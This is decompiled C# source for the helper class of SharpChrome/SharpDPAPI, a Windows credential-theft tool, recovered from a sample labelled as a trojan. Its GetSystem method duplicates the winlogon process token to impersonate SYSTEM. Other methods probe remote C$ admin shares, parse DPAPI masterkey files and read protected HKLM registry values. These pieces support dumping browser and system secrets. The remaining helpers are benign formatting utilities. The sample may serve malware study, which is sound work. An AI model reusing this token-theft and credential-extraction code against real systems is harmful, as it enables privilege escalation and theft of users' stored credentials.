// Decompiled with JetBrains decompiler
// Type: SharpDPAPI.Helpers
// Assembly: SharpChrome, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: D938FA4A-3611-4CA7-B3BE-AF9F6D845B7B
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.02-msil\VHO-Trojan.MSIL.Convagent.gen-340a639e1ec7cb2afa90a2aba177b368e13efc4dd1313e32af30b6ceb259f7d3.exe

using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Text;
using System.Text.RegularExpressions;

namespace SharpDPAPI
{
  public class Helpers
  {
    public static bool TestRemote(string computerName)
    {
      try
      {
        Directory.GetDirectories(string.Format("\\\\{0}\\C$\\Users\\", (object) computerName));
        return true;
      }
      catch (Exception ex)
      {
        Console.WriteLine("[!] Error accessing computer '{0}' : {1}", (object) computerName, (object) ex.Message);
        return false;
      }
    }

    public static string ConvertLocalPathToUNCPath(string computerName, string localPath)
    {
      try
      {
        string[] source = localPath.Split(new char[1]
        {
          Path.DirectorySeparatorChar
        }, StringSplitOptions.RemoveEmptyEntries);
        string str = source[0].Replace(':', '$');
        return string.Format("\\\\{0}\\{1}\\{2}", (object) computerName, (object) str, (object) string.Join("\\", ((IEnumerable<string>) source).Skip<string>(1).Take<string>(source.Length - 1).ToArray<string>()));
      }
      catch
      {
        return "";
      }
    }

    public static byte[] Combine(byte[] first, byte[] second)
    {
      byte[] dst = new byte[first.Length + second.Length];
      Buffer.BlockCopy((Array) first, 0, (Array) dst, 0, first.Length);
      Buffer.BlockCopy((Array) second, 0, (Array) dst, first.Length, second.Length);
      return dst;
    }

    public static string[] Combine(string[] first, string[] second)
    {
      string[] destinationArray = new string[first.Length + second.Length];
      Array.Copy((Array) first, 0, (Array) destinationArray, 0, first.Length);
      Array.Copy((Array) second, 0, (Array) destinationArray, first.Length, second.Length);
      return destinationArray;
    }

    public static bool IsUnicode(byte[] bytes)
    {
      Interop.IsTextUnicodeFlags opt = Interop.IsTextUnicodeFlags.IS_TEXT_UNICODE_STATISTICS;
      return Interop.IsTextUnicode(bytes, bytes.Length, ref opt);
    }

    public static string RemoveWhiteSpaces(string input) => Regex.Replace(input, "\\ +(?=(\\n|\\r?$))", "");

    public static string StringToCSVCell(string str)
    {
      if ((str.Contains(",") || str.Contains("\"") || str.Contains("\r") ? 1 : (str.Contains("\n") ? 1 : 0)) == 0)
        return str;
      StringBuilder stringBuilder = new StringBuilder();
      stringBuilder.Append("\"");
      foreach (char ch in str)
      {
        stringBuilder.Append(ch);
        if (ch == '"')
          stringBuilder.Append("\"");
      }
      stringBuilder.Append("\"");
      return stringBuilder.ToString();
    }

    public static string CleanForJSON(string s)
    {
      switch (s)
      {
        case "":
        case null:
          return "";
        default:
          int length = s.Length;
          StringBuilder stringBuilder = new StringBuilder(length + 4);
          for (int index = 0; index < length; ++index)
          {
            char ch = s[index];
            switch (ch)
            {
              case '\b':
                stringBuilder.Append("\\b");
                break;
              case '\t':
                stringBuilder.Append("\\t");
                break;
              case '\n':
                stringBuilder.Append("\\n");
                break;
              case '\f':
                stringBuilder.Append("\\f");
                break;
              case '\r':
                stringBuilder.Append("\\r");
                break;
              case '"':
              case '\\':
                stringBuilder.Append('\\');
                stringBuilder.Append(ch);
                break;
              case '/':
                stringBuilder.Append('\\');
                stringBuilder.Append(ch);
                break;
              default:
                if (ch < ' ')
                {
                  string str = "000" + string.Format("X", (object) ch);
                  stringBuilder.Append("\\u" + str.Substring(str.Length - 4));
                  break;
                }
                stringBuilder.Append(ch);
                break;
            }
          }
          return stringBuilder.ToString();
      }
    }

    public static DateTime ConvertToDateTime(string chromeTime)
    {
      DateTime dateTime = new DateTime(1601, 1, 1);
      try
      {
        double num = double.Parse(chromeTime) / 1000000.0;
        if (num > TimeSpan.MaxValue.TotalSeconds)
          return new DateTime(DateTime.MaxValue.Ticks);
        if (num < 0.0)
          num = 0.0;
        return dateTime.Add(TimeSpan.FromSeconds(num)).ToLocalTime();
      }
      catch
      {
        return dateTime;
      }
    }

    public static Dictionary<string, string> ParseMasterKeyFile(string filePath)
    {
      Dictionary<string, string> masterKeyFile = new Dictionary<string, string>();
      if (File.Exists(filePath))
      {
        string[] strArray1 = File.ReadAllLines(filePath);
        try
        {
          foreach (string str1 in strArray1)
          {
            char[] chArray = new char[1]{ ' ' };
            foreach (string str2 in str1.Split(chArray))
            {
              if (!string.IsNullOrEmpty(str2.Trim()))
              {
                if (str2.StartsWith("{"))
                {
                  string[] strArray2 = str2.Split(':');
                  if (!masterKeyFile.ContainsKey(strArray2[0]))
                    masterKeyFile.Add(strArray2[0], strArray2[1]);
                }
                else if (str2.StartsWith("GUID:"))
                {
                  string[] strArray3 = str2.Split(';');
                  string[] strArray4 = strArray3[0].Split(':');
                  string[] strArray5 = strArray3[1].Split(':');
                  if (!masterKeyFile.ContainsKey(strArray4[0]))
                    masterKeyFile.Add(strArray4[1], strArray5[1]);
                }
              }
            }
          }
        }
        catch (Exception ex)
        {
          Console.WriteLine("[X] Error parsing masterkey file '{0}' : {1}", (object) filePath, (object) ex.Message);
        }
      }
      else
        Console.WriteLine("[X] Masterkey file '{0}' doesn't exist!", (object) filePath);
      return masterKeyFile;
    }

    public static bool GetSystem()
    {
      if (!Helpers.IsHighIntegrity())
        return false;
      IntPtr TokenHandle = IntPtr.Zero;
      if (!Interop.OpenProcessToken(Process.GetProcessesByName("winlogon")[0].Handle, 2U, out TokenHandle))
        return false;
      IntPtr zero = IntPtr.Zero;
      if (!Interop.DuplicateToken(TokenHandle, 2, ref zero) || !Interop.ImpersonateLoggedOnUser(zero))
        return false;
      Interop.CloseHandle(TokenHandle);
      Interop.CloseHandle(zero);
      return !(WindowsIdentity.GetCurrent().Name != "NT AUTHORITY\\SYSTEM");
    }

    public static byte[] GetRegKeyValue(string keyPath)
    {
      IntPtr zero = IntPtr.Zero;
      if (Interop.RegOpenKeyEx(2147483650U, keyPath, 0, 25, ref zero) != 0)
      {
        int lastWin32Error = Marshal.GetLastWin32Error();
        string message = new Win32Exception(lastWin32Error).Message;
        Console.WriteLine("Error opening {0} ({1}) : {2}", (object) keyPath, (object) lastWin32Error, (object) message);
        return (byte[]) null;
      }
      int lpcbData = 0;
      if (Interop.RegQueryValueEx(zero, (string) null, 0, IntPtr.Zero, IntPtr.Zero, ref lpcbData) != 0)
      {
        int lastWin32Error = Marshal.GetLastWin32Error();
        string message = new Win32Exception(lastWin32Error).Message;
        Console.WriteLine("Error enumerating {0} ({1}) : {2}", (object) keyPath, (object) lastWin32Error, (object) message);
        return (byte[]) null;
      }
      IntPtr num = Marshal.AllocHGlobal(lpcbData);
      if (Interop.RegQueryValueEx(zero, (string) null, 0, IntPtr.Zero, num, ref lpcbData) != 0)
      {
        int lastWin32Error = Marshal.GetLastWin32Error();
        string message = new Win32Exception(lastWin32Error).Message;
        Console.WriteLine("Error enumerating {0} ({1}) : {2}", (object) keyPath, (object) lastWin32Error, (object) message);
        return (byte[]) null;
      }
      byte[] destination = new byte[lpcbData];
      Marshal.Copy(num, destination, 0, lpcbData);
      Interop.RegCloseKey(zero);
      return destination;
    }

    public static byte[] StringToByteArray(string hex) => Enumerable.Range(0, hex.Length).Where<int>((Func<int, bool>) (x => x % 2 == 0)).Select<int, byte>((Func<int, byte>) (x => Convert.ToByte(hex.Substring(x, 2), 16))).ToArray<byte>();

    public static IEnumerable<string> Split(string text, int partLength)
    {
      if (text == null)
        Console.WriteLine("[!] Split() - singleLineString");
      if (partLength < 1)
        Console.WriteLine("[!] Split() - 'columns' must be greater than 0.");
      double partCount = Math.Ceiling((double) text.Length / (double) partLength);
      if (partCount < 2.0)
        yield return text;
      for (int i = 0; (double) i < partCount; ++i)
      {
        int startIndex = i * partLength;
        int length = Math.Min(partLength, text.Length - startIndex);
        yield return text.Substring(startIndex, length);
      }
    }

    public static bool IsHighIntegrity() => new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator);

    public static int ArrayIndexOf(byte[] arrayToSearchThrough, byte[] patternToFind, int offset = 0)
    {
      if (patternToFind.Length > arrayToSearchThrough.Length)
        return -1;
      for (int index1 = offset; index1 < arrayToSearchThrough.Length - patternToFind.Length; ++index1)
      {
        bool flag = true;
        for (int index2 = 0; index2 < patternToFind.Length; ++index2)
        {
          if ((int) arrayToSearchThrough[index1 + index2] != (int) patternToFind[index2])
          {
            flag = false;
            break;
          }
        }
        if (flag)
          return index1;
      }
      return -1;
    }
  }
}
